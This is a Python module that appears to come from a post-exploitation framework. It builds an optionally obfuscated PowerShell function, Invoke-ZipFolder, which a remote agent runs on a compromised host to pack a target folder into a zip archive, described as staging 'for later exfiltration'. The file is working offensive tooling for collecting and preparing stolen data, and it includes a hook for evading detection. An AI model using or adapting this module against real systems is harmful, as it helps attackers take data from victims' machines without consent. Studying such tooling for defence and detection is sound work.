from lib.common import helpers

class Module:

    def __init__(self, mainMenu, params=[]):

        self.info = {
            'Name': 'Invoke-ZipFolder',

            'Author': ['@harmj0y'],

            'Description': ('Zips up a target folder for later exfiltration.'),

            'Background' : False,

            'OutputExtension' : None,
            
            'NeedsAdmin' : False,

            'OpsecSafe' : True,

            'Language' : 'powershell',

            'MinLanguageVersion' : '2',
            
            'Comments': []
        }

        # any options needed by the module, settable during runtime
        self.options = {
            # format:
            #   value_name : {description, required, default_value}
            'Agent' : {
                'Description'   :   'Agent to run module on.',
                'Required'      :   True,
                'Value'         :   ''
            },
            'Folder' : {
                'Description'   :   'Folder path to zip.',
                'Required'      :   True,
                'Value'         :   ''                
            },
            'ZipFileName' : {
                'Description'   :   'Zip name/path to create.',
                'Required'      :   True,
                'Value'         :   ''                
            }
        }

        # save off a copy of the mainMenu object to access external functionality
        #   like listeners/agent handlers/etc.
        self.mainMenu = mainMenu

        for param in params:
            # parameter format is [Name, Value]
            option, value = param
            if option in self.options:
                self.options[option]['Value'] = value


    def generate(self, obfuscate=False, obfuscationCommand=""):
        
        script = """
function Invoke-ZipFolder
{
    param([string]$Folder, [string]$ZipFileName)

    if (-not (Test-Path $Folder)) {
        "Target folder $Folder doesn't exist."
        return
    }

    if (test-path $ZipFileName) { 
        "Zip file already exists at $ZipFileName"
        return
    }

    $Directory = Get-Item $Folder

    Set-Content $ZipFileName ("PK" + [char]5 + [char]6 + ("$([char]0)" * 18))
    (dir $ZipFileName).IsReadOnly = $false

    $ZipFileName = resolve-path $ZipFileName

    $ZipFile = (new-object -com shell.application).NameSpace($ZipFileName)
    $ZipFile.CopyHere($Directory.FullName)
    "Folder $Folder zipped to $ZipFileName"
}
Invoke-ZipFolder"""
        
        for option,values in self.options.iteritems():
            if option.lower() != "agent":
                if values['Value'] and values['Value'] != '':
                    script += " -" + str(option) + " " + str(values['Value']) 
        if obfuscate:
            script = helpers.obfuscate(self.mainMenu.installPath, psScript=script, obfuscationCommand=obfuscationCommand)
        return script
